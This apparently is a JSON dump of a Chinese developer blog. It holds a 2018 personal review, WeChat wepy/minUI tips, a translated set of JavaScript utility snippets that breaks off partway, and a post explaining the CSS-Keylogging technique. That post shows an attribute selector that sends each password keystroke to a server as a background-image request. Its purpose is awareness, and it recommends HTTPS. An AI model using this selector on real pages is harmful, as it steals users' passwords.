赶了几个月项目，期间又不间断的穿插 H5 营销项目的开发，说实在的，个人并不喜欢快餐式的开发，任何一个惊艳全场的产品势必需要经过千锤百炼。 很庆幸，今年研发的主要精力放在产品上，有机会对现有项目进行迭代改造，从 vue1 到 vue2，从代码杂乱无章到 eslint 规范编码，从 bug 百出到单元测试，一步步规范工作流程，一步步朝正规军方向前进。唯一的遗憾是没能在项目中孵化点什么开源项目来，总归差了点什么。 在今年的后半段，开始负责前端开发小组的日常管理，埋头撸了一年代码抬头才发现自己对管理一窍不通，再加之生性放浪，不愿受约束更不愿约束别人，很多时候工作都有点乱糟糟的感觉。哎，躲了这么多年，终归得面对，是时候吭哧吭哧的补一波管理能力了。 今年后半段还带了一个实习生（玉米）妹子，由于第一次带实习生，再加上妹子以及指导经验的缺失，导致前期过份放松，后期又不停施压的情况发生，妹子承受不了请辞，想来也是我的责任吧！抽时间得好好反思下。 学习方面技术2018对于学习来说算是一个半糟糕的一年，技能较之去年并无明显进步，仅有岁数。 追随 vue 从 2 到现在 3，回头才发现把其余两大框架都给落下了，19年得在这基础上好好补补。 去年立的前端可视化(canvas、webGL)的 flag还没能填上，希望18年能把坑给填咯。 原定计划用来补充基本知识的书籍 《深入理解计算机系统》《算法导论》《TCP/IP协议》 迟迟没有开封（- -贼尴尬）。 通过 《鸟哥的Linux私房菜》 补充了下 linux 的基础，买了自己的服务器，也搭建了自己的个人站点，但关于 linux 的知识还是需要进一步加强。 今年通过同步翻译官方文档去学习强化 node.js，虽然最后翻译阉割了，但还是学到了很多服务端的知识，遗憾的是不熟悉 c++ ，无法进一步学习源码。 读书18年没看几本书，绝大部分还都是技术书籍，不过庆幸还读完了《与中国打交道》这本书，尝试着用不同的角度去看待世界。 来年的想读的书基本在微信读书上，希望能有机会把书架看完。 生活方面今年发生了两件影响我生活的大事，第一件的是正式从小伙伴们因为工作打散，开始了独租生活，除了电脑还是电脑，有时候还真有点落寞。第二件事呢，则是在茫茫人海捞到了我家领导，正式脱离广大程序猿队伍（A_A）。 总结2018吧，忧喜参半，2019呢，前路漫漫，他大爷还是他大爷，挖的坑，该填还是得填！","categories":[{"name":"经验总结","slug":"经验总结","permalink":"http://www.jspeng.com/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/"}],"tags":[{"name":"总结","slug":"总结","permalink":"http://www.jspeng.com/tags/%E6%80%BB%E7%BB%93/"}],"author":[{"nick":"jspeng","link":"https://www.github.com/FansOne"}]},{"title":"微信小程序wepy框架+minui踩坑之路","slug":"微信小程序wepy框架-minui踩坑之路","date":"2018-10-13T11:34:59.000Z","updated":"2018-10-13T12:36:18.000Z","comments":true,"path":"2018/10/13/微信小程序wepy框架-minui踩坑之路/","link":"","permalink":"http://www.jspeng.com/2018/10/13/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8Fwepy%E6%A1%86%E6%9E%B6-minui%E8%B8%A9%E5%9D%91%E4%B9%8B%E8%B7%AF/","excerpt":"","text":"前言：wepy框架类似Vue的MVVM开发模式，并且支持promise与ES7 asnyc异步函数，记录一下项目开发过程中遇到的坑 minUI由于minUI与wepy框架兼容性较好，而且支持单组件导入，所以选择了minUI，使用方式官网有写，需要的组件直接npm安装即可，不过要注意的是，它的form组件对form表单提交支持性并不好，如果想要提交表单还是建议原生或者使用异步提交： Note 小程序组件系统中组件是隔离的，所以提交表单时无法用 form 表单获取输入框中的值，只能单独获取 minUI中的button组件并不支持disabled禁用(或者我没看懂文档，至少直接写disabled不行)。 minUI中的很多组件样式是无法通过style或者class控制的，所以如果有需要，可以进入packages，找到组件的wxss自行添加。 minUI可以和原生组件一起使用，例如原生scroll-view+minUI中的list。 wepy wepy的组件与父级css是共用的，也就是说主页面中的css组件也可以使用。 发送广播是向子组件传输数据的重要手段，而且子组件中的events可以当成子组件的生命周期函数使用(类似子组件的 onLoad)。 在组件中写生命周期其实是调用组件页面的生命周期，所以就像文档说的不需要写生命周期函数。 页面调用全局是this.globalData.*，组件调用全局变量是this.$parent.globalData.*，组件中的组件调this.$parent.$parent.*，此类推。 子组件所需要引入的UI组件/其他组件，都写在父级页面的usingComponents中，注意路径不要写错。 由于第一次用，所以刚开始修改了dist文件导致项目崩溃(其实人也很崩溃)，然后就是一个漫长的恢复项目的过程，重新cli等，但是发现还是不成功，显示页面构建失败之类的，刚开始发现忘了装async的pollyfill，npm后还是报错，最后查阅资料发现是babel的配置出了问题，于是乎修改了wepy.config.json再次编译如果显示UI组件找不到，路径正确的情况下可能是未开启微信小程序ide的ES6转ES5，最后再次build终于成功，所以请勿修改dist文件夹！ 不知道是不是build –watch的问题，在编译中添加文件后，删除/重命名文件都无效，只要被build进去的文件无法通过再次build删除(无奈)，所以最后上传小程序时，我采用的方法是将dist文件单拎出来，对其中无效(被删除/重命名)的文件进行整理，最后记得整理app.json文件，最后进行上传即可。注：其中_wepylogs.js文件是用来记录错误的，在wepy编译中最后一次错误会被记录在这里，上传之前记得清除一下。 Echarts这个参考一位大佬所写的方法： https://blog.csdn.net/juzipidemimi/article/details/81807110 需要注意的是，我是将开源中的项目down下来直接复制了charts文件夹，其中每一个charts的组件中，存在一个initChart方法，它是用来代替原来的ec:{}，原理在文章中有写，这个方法被写在了methods(){}中，如果你想通过后台数据实现动态刷新图表，可以使用ES7的async将你的request变为异步函数，最后在.then中进行initChart，否则如果请求的时间在initChart之后，图表是不会渲染出来的，因为数据没有请求到。 目前项目顺利开发完成，上传的dist目录结构： 注：index.template.html不会被上传","categories":[{"name":"经验总结","slug":"经验总结","permalink":"http://www.jspeng.com/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/"}],"tags":[{"name":"WeChat","slug":"WeChat","permalink":"http://www.jspeng.com/tags/WeChat/"},{"name":"wepy","slug":"wepy","permalink":"http://www.jspeng.com/tags/wepy/"},{"name":"minUI","slug":"minUI","permalink":"http://www.jspeng.com/tags/minUI/"}],"author":[{"nick":"jspeng","link":"https://www.github.com/FansOne"}]},{"title":"使用 Css 获取用户密码","slug":"使用 Css 获取用户密码","date":"2018-09-26T21:06:32.000Z","updated":"2018-09-27T06:17:07.000Z","comments":true,"path":"2018/09/27/使用 Css 获取用户密码/","link":"","permalink":"http://www.jspeng.com/2018/09/27/%E4%BD%BF%E7%94%A8%20Css%20%E8%8E%B7%E5%8F%96%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81/","excerpt":"","text":"前言在 github 上闲逛，发现了一个很有趣的项目，叫 CSS-Keylogging，这是一个演示如何用 css 去获取用户输入的密码的项目，这个项目与之前前的另外一个很火的项目 CrookedStyleSheets 类似，甚至于有可能 CSS-Keylogging 就是受 CrookedStyleSheets 启发才创建的。 不一样的 css说到 css，大多数人的第一印象基本上就是用来配置界面样式的，甚至于连语言都称不上，但随着 web 技术的不停发展，其所具有的能力也与日俱新，不再是当初那个仅仅满足最基本布局需求的层叠样式表了，至于新的属性新的功能点笔者也了解不全，在这里也不便展开了。 话题回到不一样的 css 上，github 上 jbtronics 给出了这样一份答案 CrookedStyleSheets，在这里笔者直接给上该项目的中文文档，该文档上有一段关于输入监测的段落，请详细阅读完，如果早已看过请跳过继续看本文的后续部分。 css 监听键盘记录CSS-Keylogging 项目使用 css 监听键盘记录的方式一致，基本上是通过 css 选择器去实现功能，CSS-Keylogging 更为巧妙的使用多重选择器去捕获相应的按键事件。 核心代码如下: input[type=&quot;password&quot;][value$=&quot;1&quot;] &#123; background-image: url(&quot;http://localhost:3000/1&quot;); &#125; 解释如下 当 type 为 ‘password’ 的输入框的输入的最后一个字符为 ‘1’ 时使用 url 为 http://localhost:3000/1 的背景图，css 在这种情况下会尝试进行 get 请求获取资源，这样的话，服务端就能接收到来至客户端发送的 get 请求。 当 value$=”1” 时，我们可以监听用户输入 1，那如果我们监听键盘上所有的按键字符，那我们是不是就可以监听用户的所有按键输入了？答案是可以，该项目使用 go 脚本遍历 ascii 码表，将所有键盘可输入按键字符均进行捕获，生成如下样式表： 当然也可以用使用 nodejs 去生成样式表，至今不明白作者为什么用 node 搭服务器然后用 go 写脚本。。。有兴趣的同学可以将项目 clone 下来跑起来试试。 ##总结 为了避免有目的性的劫持注入，请尽快升级 https ，预防这种情况的发生，网络安全无处不在，希望不要选择性的去忽视它。","categories":[{"name":"经验总结","slug":"经验总结","permalink":"http://www.jspeng.com/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/"}],"tags":[{"name":"css","slug":"css","permalink":"http://www.jspeng.com/tags/css/"},{"name":"安全","slug":"安全","permalink":"http://www.jspeng.com/tags/%E5%AE%89%E5%85%A8/"}],"author":{"nick":"jsPeng","link":"https://www.github.com/FansOne"}},{"title":"30s代码片段翻译","slug":"30s代码片段翻译","date":"2018-08-12T14:25:42.000Z","updated":"2018-08-12T14:27:02.000Z","comments":true,"path":"2018/08/12/30s代码片段翻译/","link":"","permalink":"http://www.jspeng.com/2018/08/12/30s%E4%BB%A3%E7%A0%81%E7%89%87%E6%AE%B5%E7%BF%BB%E8%AF%91/","excerpt":"","text":"ArrayArray concatenation (合并参数)使用 Array.concat() 来连接参数中的任何数组或值。 12const arrayConcat = (arr, ...args) =&gt; arr.concat(...args);// arrayConcat([1], 2, [3], [[4]]) -&gt; [1,2,3,[4]] Array difference (取数组不同项)以 b 创建 Set，然后使用 Array.filter() 过滤，只保留 b 中不包含的值。 12const difference = (a, b) =&gt; &#123; const s = new Set(b); return a.filter(x =&gt; !s.has(x)); &#125;;// difference([1,2,3], [1,2]) -&gt; [3] Array intersection (取数组相同项)以 b 创建 Set，然后使用 Array.filter() 过滤，只保留 b 中包含的值。 12const intersection = (a, b) =&gt; &#123; const s = new Set(b); return a.filter(x =&gt; s.has(x)); &#125;;// intersection([1,2,3], [4,3,2]) -&gt; [2,3] Array union (合并数组去重)用 a 和 b 的所有值创建一个 Set 并转换成一个数组。 12const union = (a, b) =&gt; Array.from(new Set([...a, ...b]));// union([1,2,3], [4,3,2]) -&gt; [1,2,3,4] Average of array of numbers (通过数组取平均值)使用 Array.reduce() 将每个值添加到一个累加器，用值 0 初始化，除以数组的长度。 12const average = arr =&gt; arr.reduce((acc, val) =&gt; acc + val, 0) / arr.length;// average([1,2,3]) -&gt; 2 Chunk array (数组切块)使用 Array.from() 创建一个满足块的数量的新的数组。使用 Array.slice() 将新数组的每个元素映射到 size 长度的块。如果原始数组不能均匀分割，最后的块将包含剩余的元素。 123const chunk = (arr, size) =&gt;Array.from(&#123;length: Math.ceil(arr.length / size)&#125;, (v, i) =&gt; arr.slice(i * size, i * size + size));// chunk([1,2,3,4,5], 2) -&gt; [[1,2],[3,4],5] Compact (压缩)使用 Array.filter() 去过滤掉假值（false, null, 0, &quot;&quot;, undefined 和 NaN）。 12const compact = (arr) =&gt; arr.filter(v =&gt; v);// compact([0, 1, false, 2, &#x27;&#x27;, 3, &#x27;a&#x27;, &#x27;e&#x27;*23, NaN, &#x27;s&#x27;, 34]) -&gt; [ 1, 2, 3, &#x27;a&#x27;, &#x27;s&#x27;, 34 ] Count occurrences of a value in array (计算数组中指定值出现的次数)使用 Array.reduce() 去迭代数组，当值相同时，递增计数器。 12const countOccurrences = (arr, value) =&gt; arr.reduce((a, v) =&gt; v === value ? a + 1 : a + 0, 0);// countOccurrences([1,1,2,1,2,3], 1) -&gt; 3 Deep flatten array (深度展开数组)使用递归。使用 Array.reduce() 获取所有不是数组的值，并将数组展开。 123const deepFlatten = arr =&gt;arr.reduce((a, v) =&gt; a.concat(Array.isArray(v) ? deepFlatten(v) : v), []);// deepFlatten([1,[2],[[3],4],5]) -&gt; [1,2,3,4,5] Drop elements in array (删除数组中的元素)循环访问数组，使用 Array.shift() 删除数组的第一个元素，直到函数的返回值为 true，返回其余的元素。 12345const dropElements = (arr, func) =&gt; &#123; while (arr.length &gt; 0 &amp;&amp; !func(arr[0])) arr.shift(); return arr;&#125;;// dropElements([1, 2, 3, 4], n =&gt; n &gt;= 3) -&gt; [3,4] Fill array (填充数组)使用 Array.map() 将 start（包含） 和 end（不包含） 之间的值映射为 value。省略 start 将从第一个元素开始／省略 end 将在数组最后结束。 123const fillArray = (arr, value, start = 0, end = arr.length) =&gt;arr.map((v, i) =&gt; i &gt;= start &amp;&amp; i &lt; end ? value : v);// fillArray([1,2,3,4],&#x27;8&#x27;,1,3) -&gt; [1,&#x27;8&#x27;,&#x27;8&#x27;,4] Filter out non-unique values in an array (过滤掉数组中重复的值)使用 Array.filter() 保证数组仅包含唯一值。 12const filterNonUnique = arr =&gt; arr.filter(i =&gt; arr.indexOf(i) === arr.lastIndexOf(i));// filterNonUnique([1,2,2,3,4,4,5]) -&gt; [1,3,5] Flatten array up to depth (展开指定深度的数组)使用递归去递减深度。使用 Array.reduce() 和 Array.concat() 来合并元素或数组。基本情况下，当深度为 1 时停止递归。省略第二个参数，展开深度为 1。 1234const flattenDepth = (arr, depth = 1) =&gt;depth != 1 ? arr.reduce((a, v) =&gt; a.concat(Array.isArray(v) ? flattenDepth(v, depth - 1) : v), []) : arr.reduce((a, v) =&gt; a.concat(v), []);// flattenDepth([1,[2],[[[3],4],5]], 2) -&gt; [1,2,[3],4,5] Flatten array (拼合数组)使用 Array.reduce() 来获取内部所有元素并用 concat() 合并它们。 12const flatten = arr =&gt; arr.reduce((a, v) =&gt; a.concat(v), []);// flatten([1,[2],3,4]) -&gt; [1,2,3,4] Get max value from array (获取数组中的最大值)使用 Math.max() 配合 … 扩展运算符去获取数组中的最大值。 12const arrayMax = arr =&gt; Math.max(...arr);// arrayMax([10, 1, 5]) -&gt; 10 Get min value from array (获取数组中的最小值)使用 Math.max() 配合 … 扩展运算符去获取数组中的最小值。 12const arrayMin = arr =&gt; Math.min(...arr);// arrayMin([10, 1, 5]) -&gt; 1 Group by (条件分组)使用 Array.map() 将数组的值映射到函数或属性名称。使用 Array.reduce() 创建一个对象，其中的键是从映射的结果中产生的。 12345const groupBy = (arr, func) =&gt;arr.map(typeof func === &#x27;function&#x27; ? func : val =&gt; val[func]).reduce((acc, val, i) =&gt; &#123; acc[val] = (acc[val] || []).concat(arr[i]); return acc; &#125;, &#123;&#125;);// groupBy([6.1, 4.2, 6.3], Math.floor) -&gt; &#123;4: [4.2], 6: [6.1, 6.3]&#125;// groupBy([&#x27;one&#x27;, &#x27;two&#x27;, &#x27;three&#x27;], &#x27;length&#x27;) -&gt; &#123;3: [&#x27;one&#x27;, &#x27;two&#x27;], 5: [&#x27;three&#x27;]&#125; Head of list (获取数组的首个元素)使用 arr[0] 返回传递数组的第一个元素。 12const head = arr =&gt; arr[0];// head([1,2,3]) -&gt; 1 Initial of list使用 arr,slice(0, -1) 去返回去除最后一个元素的数组。 12const initial = arr =&gt; arr.slice(0, -1);// initial([1,2,3]) -&gt; [1,2] Initialize array with range (使用指定范围来定义数组)使用 Array(end-start) 创建一个所需长度的数组，使用 Array.map() 来填充范围中的所需值。你可以省略start，默认值为 0。 123const initializeArrayRange = (end, start = 0) =&gt;Array.apply(null, Array(end - start)).map((v, i) =&gt; i + start);// initializeArrayRange(5) -&gt; [0,1,2,3,4] Initialize array with values (使用指定值来定义数组)使用 Array(n) 创建一个所需长度的数组，使用 fill(v) 去填充所需要的值。亦可以省略 value，默认值为 0。 12const initializeArray = (n, value = 0) =&gt; Array(n).fill(value);// initializeArray(5, 2) -&gt; [2,2,2,2,2] Last of list (获取数组的结尾)使用 arr.slice(-1)[0] 获得给定数组的最后一个元素。 12const last = arr =&gt; arr.slice(-1)[0];// last([1,2,3]) -&gt; 3 Median of array of numbers (获取数组的中间值)找到数组的中间，使用 Array.sort() 对值进行排序。如果长度是奇数，则返回中点处的数字，否则返回两个中间数字的平均值。 123456const median = arr =&gt; &#123;const mid = Math.floor(arr.length / 2), nums = arr.sort((a, b) =&gt; a - b); return arr.length % 2 !== 0 ? nums[mid] : (nums[mid - 1] + nums[mid]) / 2;&#125;;// median([5,6,50,1,-5]) -&gt; 5// median([0,10,-2,7]) -&gt; 3.5 Nth element of array (获取数组的第 N 个元素)使用 Array.slice() 得到一个包含第一个元素的数组。如果索引超出范围，则返回 []。（译者注：超过索引返回 undefind）省略第二个参数 n 来获取数组的第一个元素。 123const nth = (arr, n=0) =&gt; (n&gt;0? arr.slice(n,n+1) : arr.slice(n))[0];// nth([&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;],1) -&gt; &#x27;b&#x27;// nth([&#x27;a&#x27;,&#x27;b&#x27;,&#x27;b&#x27;]-2) -&gt; &#x27;a&#x27; Pick (挑选)使用 Array.reduce() 去过滤／挑选存在于 obj 中的 key 值，并转换回相应的键值对的对象。 1234const pick = (obj, arr) =&gt;arr.reduce((acc, curr) =&gt; (curr in obj &amp;&amp; (acc[curr] = obj[curr]), acc), &#123;&#125;);// pick(&#123; &#x27;a&#x27;: 1, &#x27;b&#x27;: &#x27;2&#x27;, &#x27;c&#x27;: 3 &#125;, [&#x27;a&#x27;, &#x27;c&#x27;]) -&gt; &#123; &#x27;a&#x27;: 1, &#x27;c&#x27;: 3 &#125;// pick(object, [&#x27;a&#x27;, &#x27;c&#x27;])[&#x27;a&#x27;] -&gt; 1 Shuffle array (随机数组)使用 Array.sort() 在比较器中使用 Math.random() 重新排序元素。 12const shuffle = arr =&gt; arr.sort(() =&gt; Math.random() - 0.5);// shuffle([1,2,3]) -&gt; [2,3,1] Similarity between arrays (获取数组的交集)使用 filter() 移除不是 values 的一部分的值，使用 includes() 确定。 12const similarity = (arr, values) =&gt; arr.filter(v =&gt; values.includes(v));// similarity([1,2,3], [1,2,4]) -&gt; [1,2] Sum of array of numbers (数组的总和)使用 Array.reduce() 去迭代值并计算累计器，初始值为 0。 12const sum = arr =&gt; arr.reduce((acc, val) =&gt; acc + val, 0);// sum([1,2,3,4]) -&gt; 10 Tail of list (列表的尾巴)如果数组的长度大于1，则返回 arr.slice(1)，否则返回整个数组。 123const tail = arr =&gt; arr.length &gt; 1 ? arr.slice(1) : arr;// tail([1,2,3]) -&gt; [2,3]// tail([1]) -&gt; [1] Take (抽取)使用 Array.slice() 从头开始创建 n 个元素的数组。 123const take = (arr, n = 1) =&gt; arr.slice(0, n);// take([1, 2, 3], 5) -&gt; [1, 2, 3]// take([1, 2, 3], 0) -&gt; [] Unique values of array (数组去重)使用ES6 Set 和 …rest 运算符去除所有重复的值。 12const unique = arr =&gt; [...new Set(arr)];// unique([1,2,2,3,4,4,5]) -&gt; [1,2,3,4,5] BrowserBottom visible (底部可见即滚动至底部)使用 scrollY，scrollHeight 和 clientHeight 来确定页面的底部是否可见。 123const bottomVisible = _ =&gt;document.documentElement.clientHeight + window.scrollY &gt;= (document.documentElement.scrollHeight || document.documentElement.clientHeight);// bottomVisible() -&gt; true Current URL (当前链接地址)使用 window.location.href 来获取当前链接地址。 12const currentUrl = _ =&gt; window.location.href;// currentUrl() -&gt; &#x27;https://google.com&#x27; Element is visible in viewport (元素在视窗中可见)使用 Element.getBoundingClientRect() 和 window.inner(Width|Height) 值来确定给定的元素在视口中是否可见。第二个参数用来指定元素是否要求完全可见，指定 true 即部分可见，默认为全部可见。 12345678910const elementIsVisibleInViewport = (el, partiallyVisible = false) =&gt; &#123; const &#123; top, left, bottom, right &#125; = el.getBoundingClientRect(); return partiallyVisible ? ((top &gt; 0 &amp;&amp; top &lt; innerHeight) || (bottom &gt; 0 &amp;&amp; bottom &lt; innerHeight)) &amp;&amp; ((left &gt; 0 &amp;&amp; left &lt; innerWidth) || (right &gt; 0 &amp;&amp; right &lt; innerWidth)) : top &gt;= 0 &amp;&amp; left &gt;= 0 &amp;&amp; bottom &lt;= innerHeight &amp;&amp; right &lt;= innerWidth;&#125;;// e.g. 100x100 viewport and a 10x10px element at position &#123;top: -1, left: 0, bottom: 9, right: 10&#125;// elementIsVisibleInViewport(el) -&gt; false (not fully visible)// elementIsVisibleInViewport(el, true) -&gt; true (partially visible) Get scroll position (获取滚动位置)如果存在，使用 pageXOffset 和 pageYOffset，否则使用 scrollLeft 和 scrollTop。你可以省略 el，默认使用 window。 1234const getScrollPos = (el = window) =&gt; (&#123;x: (el.pageXOffset !== undefined) ? el.pageXOffset : el.scrollLeft, y: (el.pageYOffset !== undefined) ? el.pageYOffset : el.scrollTop&#125;);// getScrollPos() -&gt; &#123;x: 0, y: 200&#125; Redirect to URL (URL 重定向)使用 window.location.href 或者 window.location.replace() 去重定向到 url。第二个参数用来控制模拟链接点击（true - 默认）还是 HTTP 重定向（false）。 123const redirect = (url, asLink = true) =&gt; asLink ? window.location.href = url : window.location.replace(url);// redirect(&#x27;https://google.com&#x27;) Scroll to top (滚动至顶部)使用 document.documentElement.scrollTop 或 document.body.scrollTop 获取到顶端的距离。从顶部滚动一小部分距离。 使用 window.requestAnimationFrame（） 实现滚动动画。 12345678const scrollToTop = _ =&gt; &#123; const c = document.documentElement.scrollTop || document.body.scrollTop; if (c &gt; 0) &#123; window.requestAnimationFrame(scrollToTop); window.scrollTo(0, c - c / 8); &#125;&#125;;// scrollToTop() DateGet days difference between dates (获取两个日期间的差距)计算两个 Date 对象之间的差距（以天为单位）。 12const getDaysDiffBetweenDates = (dateInitial, dateFinal) =&gt; (dateFinal - dateInitial) / (1000 * 3600 * 24);// getDaysDiffBetweenDates(new Date(&quot;2017-12-13&quot;), new Date(&quot;2017-12-22&quot;)) -&gt; 9 FunctionChain asynchronous functions (链式异步函数)循环遍历包含异步事件的函数数组，当每个异步事件完成时调用 next。 12345678const chainAsync = fns =&gt; &#123; let curr = 0; const next = () =&gt; fns[curr++](next); next(); &#125;;/*chainAsync([next =&gt; &#123; console.log(&#x27;0 seconds&#x27;); setTimeout(next, 1000); &#125;,next =&gt; &#123; console.log(&#x27;1 second&#x27;); setTimeout(next, 1000); &#125;,next =&gt; &#123; console.log(&#x27;2 seconds&#x27;); &#125;])*/ Curry (函数柯里化)使用递归。如果提供的参数（args）的数量足够，则调用传递的函数 fn，否则返回一个柯里化函数 fn，等待传入剩下的参数。如果你想要一个接受参数数量可变的函数（一个可变参数函数，例如Math.min()），你可以选择将参数个数传递给第二个参数 arity。 123456const curry = (fn, arity = fn.length, ...args) =&gt;arity &lt;= args.length ? fn(...args) : curry.bind(null, fn, arity, ...args);// curry(Math.pow)(2)(10) -&gt; 1024// curry(Math.min, 3)(10)(50)(2) -&gt; 2 Pipe (管道)使用 Array.reduce() 让值在函数间流通。 12const pipe = (...funcs) =&gt; arg =&gt; funcs.reduce((acc, func) =&gt; func(acc), arg);// pipe(btoa, x =&gt; x.toUpperCase())(&quot;Test&quot;) -&gt; &quot;VGVZDA==&quot; Promisify (promise转化)使用 currying 返回一个函数，返回一个调用原始函数的 Promise。使用 …rest 运算符传入所有参数。 In Node 8+, you can use util.promisify Node 8 版本以上，你可以使用 util.promisify 12345678const promisify = func =&gt;(...args) =&gt; new Promise((resolve, reject) =&gt; func(...args, (err, result) =&gt; err ? reject(err) : resolve(result)) );// const delay = promisify((d, cb) =&gt; setTimeout(cb, d))// delay(2000).then(() =&gt; console.log(&#x27;Hi!&#x27;)) -&gt; Promise resolves after 2s Run promises in series (队列运行promise)使用 Array.reduce() 通过创建一个 promise 链来运行一系列 promise，每个 promise 在解析时返回下一个 promise。 123const series = ps =&gt; ps.reduce((p, next) =&gt; p.then(next), Promise.resolve());// const delay = (d) =&gt; new Promise(r =&gt; setTimeout(r, d))// series([() =&gt; delay(1000), () =&gt; delay(2000)]) -&gt; executes each promise sequentially, taking a total of 3 seconds to complete Sleep (睡眠)通过返回一个 Promise 延迟执行 async 函数，把它放到睡眠状态。 12345678const sleep = ms =&gt; new Promise(resolve =&gt; setTimeout(resolve, ms));/*async function sleepyWork() &#123; console.log(&#x27;I\\&#x27;m going to sleep for 1 second.&#x27;); await sleep(1000); console.log(&#x27;I woke up after 1 second.&#x27;);&#125;*/ MathCollatz algorithm (考拉兹算法)如果 n 是偶数，返回 n/2，否则返回 3n+1。 123const collatz = n =&gt; (n % 2 == 0) ? (n / 2) : (3 * n + 1);// collatz(8) --&gt; 4// collatz(5) --&gt; 16 Distance between two points (两点间的距离)使用 Matg.hypot() 来计算两点间的欧式距离。 12const distance = (x0, y0, x1, y1) =&gt; Math.hypot(x1 - x0, y1 - y0);// distance(1,1, 2,3) -&gt; 2.23606797749979 Divisible by number (可否被整除)使用模运算符（％）来检查余数是否等于 0。 12const isDivisible = (dividend, divisor) =&gt; dividend % divisor === 0;// isDivisible(6,3) -&gt; true Even or odd number (偶数或奇数)使用模运算符（%）来计算一个数为偶数还是奇数。返回 true 为偶数，返回 false 则为奇数。 12const isEven = num =&gt; num % 2 === 0;// isEven(3) -&gt; false Factorial (阶乘)使用递归。如果 n 小于或等于 1，返回 1。其它情况，则返回 n 和 n-1 的阶乘的积。 12const factorial = n =&gt; n &lt;= 1 ? 1 : n * factorial(n - 1);// factorial(6) -&gt; 720 Fibonacci array generator (斐波纳契数组生成器)创建一个指定长度的空数组，初始化前两个值（0和1）。使用 Array.reduce() 将最后两个值的总和添加到数组中（前两个除外）。 123const fibonacci = n =&gt; Array(n).fill(0).reduce((acc, val, i) =&gt; acc.concat(i &gt; 1 ? acc[i - 1] + acc[i - 2] : i), []);// fibonacci(5) -&gt; [0,1,1,2,3] Greatest common divisor (GCD) (最大公约数)(译者注：使用辗转相乘法)使用递归。基本情况是如果 y 等于 0，则返回 x。其它情况下，返回 y 与 x/y 的最大公约数。 12const gcd = (x, y) =&gt; !y ? x : gcd(y, x % y);// gcd (8, 36) -&gt; 4 Hamming distance (汉明距离)使用 异或 运算符（^）去查找两个数值间的位差，使用 toString(2) 转换为二进制值，使用 match(/1/g) 计算并返回字符串中 1 的数量。 123const hammingDistance = (num1, num2) =&gt; ((num1 ^ num2).toString(2).match(/1/g) || &#x27;&#x27;).length;// hammingDistance(2,3) -&gt; 1 Percentile (百分位数)使用百分比公式计算给定数组中有多少个数小于或等于给定值。 使用Array.reduce()计算值的下面有多少个数是相同的值, 并应用百分比公式。 123const percentile = (arr, val) =&gt; 100 * arr.reduce((acc,v) =&gt; acc + (v &lt; val ? 1 : 0) + (v === val ? 0.5 : 0), 0) / arr.length;// percentile([1,2,3,4,5,6,7,8,9,10], 6) -&gt; 55 Powerset (幂集)使用 Array.reduce() 与 Array.map() 结合来迭代元素并将其组合成一个包含所有组合的数组。 123const powerset = arr =&gt; arr.reduce((a, v) =&gt; a.concat(a.map(r =&gt; [v].concat(r))), [[]]);// powerset([1,2]) -&gt; [[], [1], [2], [2,1]] Round number to n digits (取小数点后 n 位)使用 Math.round() 和字符串模板将数字四舍五入到指定的位数。省略第二个参数，decimals 将四舍五入到一个整数。 12const round = (n, decimals=0) =&gt; Number(`$&#123;Math.round(`$&#123;n&#125;e$&#123;decimals&#125;`)&#125;e-$&#123;decimals&#125;`);// round(1.005, 2) -&gt; 1.01 Standard deviation (标准差)Use Array.reduce() to calculate the mean, variance and the sum of the variance of the values, the variance of the values, thendetermine the standard deviation.You can omit the second argument to get the sample standard deviation or set it to true to get the population standard deviation. 使用 Array.reduce() 来计算平均值，方差以及方差之和，然后确定标准偏差。您可以省略第二个参数来获取样本标准差或将其设置为 true 以获得总体标准差。 123456789const standardDeviation = (arr, usePopulation = false) =&gt; &#123; const mean = arr.reduce((acc, val) =&gt; acc + val, 0) / arr.length; return Math.sqrt( arr.reduce((acc, val) =&gt; acc.concat(Math.pow(val - mean, 2)), []) .reduce((acc, val) =&gt; acc + val, 0) / (arr.length - (usePopulation ? 0 : 1)) );&#125;;// standardDeviation([10,2,38,23,38,23,21]) -&gt; 13.284434142114991 (sample)// standardDeviation([10,2,38,23,38,23,21], true) -&gt; 12.29899614287479 (population) Media (媒体)Speech synthesis (experimental) 语音合成(试验功能)使用 SpeechSynthesisUtterance.voice 和 indow.speechSynthesis.getVoices() 将消息转换为语音。使用 window.speechSynthesis.speak() 来播放消息。 了解更多关于 SpeechSynthesisUtterance interface of the Web Speech API. 123456const speak = message =&gt; &#123; const msg = new SpeechSynthesisUtterance(message); msg.voice = window.speechSynthesis.getVoices()[0]; window.speechSynthesis.speak(msg);&#125;;// speak(&#x27;Hello, World&#x27;) -&gt; plays the message Object (对象)Object from key-value pairs (键值对创建对象)使用 Array.reduce() 创建和组合键值对。 12const objectFromPairs = arr =&gt; arr.reduce((a, v) =&gt; (a[v[0]] = v[1], a), &#123;&#125;);// objectFromPairs([[&#x27;a&#x27;,1],[&#x27;b&#x27;,2]]) -&gt; &#123;a: 1, b: 2&#125; Object to key-value pairs (对象生成键值对)使用 Object.keys() 和 Array.map() 去遍历对象的键并生成一个包含键值对的数组。 12const objectToPairs = obj =&gt; Object.keys(obj).map(k =&gt; [k, obj[k]]);// objectToPairs(&#123;a: 1, b: 2&#125;) -&gt; [[&#x27;a&#x27;,1],[&#x27;b&#x27;,2]]) Shallow clone object (浅拷贝对象)使用 …spread 扩展运算符将目标对象的属性添加到拷贝对象中。 123456const shallowClone = obj =&gt; (&#123; ...obj &#125;);/*const a = &#123; x: true, y: 1 &#125;;const b = shallowClone(a);a === b -&gt; false*/ String (字符串)Anagrams of string (with duplicates) (字符串异位(和重复))使用递归。遍历给定字符串中的每个字母，用其余字母创建所有部分字母。使用 Array.map() 将字母与每个部分字母组合，然后使用 Array.reduce() 将所有字母组合到一个数组中。当给定字符串数量等与 2 或 1 时做简单处理。＝ 123456const anagrams = str =&gt; &#123; if (str.length &lt;= 2) return str.length === 2 ? [str, str[1] + str[0]] : [str]; return str.split(&#x27;&#x27;).reduce((acc, letter, i) =&gt; acc.concat(anagrams(str.slice(0, i) + str.slice(i + 1)).map(val =&gt; letter + val)), []);&#125;;// anagrams(&#x27;abc&#x27;) -&gt; 